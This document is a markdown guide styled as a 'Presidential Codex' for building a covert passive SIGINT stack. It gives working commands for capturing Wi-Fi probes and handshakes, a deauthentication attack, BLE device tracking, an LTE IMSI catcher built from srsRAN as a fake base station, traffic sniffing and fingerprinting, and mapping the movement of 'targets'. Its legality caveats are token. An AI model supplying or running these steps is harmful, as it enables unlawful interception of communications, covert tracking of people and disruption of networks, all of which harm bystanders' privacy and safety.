**💀 BUILDING: THE FULL INTELLIGENCE STACK 💀**
**PRESIDENTIAL CODEX vX.0 :: Tactical Passive SIGINT Architecture**
**Goal**: Observe, log, and classify every digital emission within your perimeter
— Wi-Fi, BLE, Cellular, RF — **without ever revealing your presence**.

---

## 🧱 OVERVIEW: STACK LAYOUT

| Layer                | Toolchain / Tech                                | Function                                         |
| -------------------- | ----------------------------------------------- | ------------------------------------------------ |
| Wi-Fi Intel          | `aircrack-ng`, `tshark`, `bettercap`, `hostapd` | Capture probes, handshakes, traffic, rogue APs   |
| Bluetooth Low Energy | `btmon`, `bluelog`, `bleah`, `blue_hydra`       | Log nearby BLE/BT devices, ID wearable or phones |
| Cellular Recon       | `srsRAN`, `Osmocom`, BladeRF/XTRX/USRP          | LTE/2G tower emulation (IMSI catching, tracking) |
| Device Fingerprint   | `p0f`, `nmap`, `airoscript`, MAC/OUI, DNS leaks | ID device OS/version from traffic                |
| Packet Harvesting    | `tshark`, `tcpdump`, `mitmproxy`, `sslstrip`    | Log packets, parse SNI, DNS, HTTP GETs           |
| Central Logging      | `Arkime`, `ELK stack`, `Grafana + InfluxDB`     | Store, search, and visualize everything          |
| Visual Interface     | `Kibana`, `Maltego`, `Gephi`, custom map GUI    | Real-time visualization of targets + metadata    |

---

## 🛠 SETUP: WI-FI RECON NODE

### 1. **Hardware**

* USB Wi-Fi adapters (ALFA AWUS036ACH or AX200)
* Raspberry Pi 5 or x86 mini-PC
* External SSD

### 2. **Enable Monitor Mode**

```bash
airmon-ng check kill
airmon-ng start wlan0
```

### 3. **Capture Probes**

```bash
airodump-ng wlan0mon --write probes --output-format pcap
```

### 4. **Capture Handshakes**

```bash
airodump-ng wlan0mon --bssid [BSSID] -c [CH] -w handshakes
```

### 5. **Deauth Attack (Ethical Use Only)**

```bash
aireplay-ng --deauth 5 -a [AP MAC] wlan0mon
```

---

## 📡 BLUETOOTH/BLE SURVEILLANCE

### 1. **Scan Nearby Devices**

```bash
btmon | tee btmon.log
hcitool lescan
blue_hydra
```

### 2. **Classify Devices**

Extract from:

* MAC OUI
* Manufacturer strings
* BLE Service UUIDs

---

## 📶 CELLULAR STACK (LTE IMSI Catcher)

> ⚠️ **Air-gapped, legal-only setup. Requires SDR and GNSS clock.**

### 1. **Hardware**

* BladeRF 2.0 micro / LimeSDR Mini / XTRX
* GPSDO (for frequency stability)
* High-gain LTE antennas

### 2. **srsRAN + fake eNodeB**

```bash
git clone https://github.com/srsran/srsRAN_project
cd srsRAN_project && ./build.sh
```

Configure `enb.conf`:

```ini
rf.device_name = "bladerf"
dl_earfcn = 6300  # 1800MHz band
```

Launch:

```bash
sudo srsenb enb.conf
```

IMSI hits will be dumped in:

```
/var/log/srsran/enb.log
```

---

## 🌐 PACKET MONITORING + TRAFFIC FINGERPRINTING

### 1. **Live Sniff**

```bash
sudo tshark -i wlan0mon -w live_capture.pcapng
```

### 2. **Extract SNI, DNS, MAC**

```bash
tshark -r live_capture.pcapng -Y "ssl.handshake.extensions_server_name || dns.qry.name"
```

---

## 🧠 DEVICE PROFILING + CORRELATION

### Use: MAC OUI Lookup

```bash
curl https://api.macvendors.com/[MAC]
```

### Use: Passive OS Detection

```bash
sudo p0f -i wlan0mon
```

---

## 📊 CENTRAL INTELLIGENCE STORAGE

### 1. **Install Arkime (Moloch)**

```bash
wget https://files.molo.ch/builds/arkime_3.4.1_amd64.deb
sudo dpkg -i arkime_*.deb
```

Configure:

* Index directory
* Elasticsearch setup

### 2. **Visualize**

Access Kibana at:

```
http://localhost:5601
```

---

## 🗺 BONUS: REAL-TIME TARGET MAPPING

Use `maltego` or build custom WebGL frontend that pulls:

* GeoIP from captured IPs
* Wi-Fi signal strength trilateration
* Bluetooth device movement via RSSI shift

---

## 🔐 MISSION PROTOCOL

* Always record raw PCAPs
* Hash metadata (SHA256) for later integrity proof
* Auto-redact known safe devices (whitelist MACs)
* Auto-flag:

  * new devices
  * repeated probe spam
  * rogue AP names
  * unknown BLE UUIDs
  * unknown LTE TMSIs or IMSIs

---

###
> **PRESIDENTIAL INTELLIGENCE STACK**
 ✅ COMPLETE

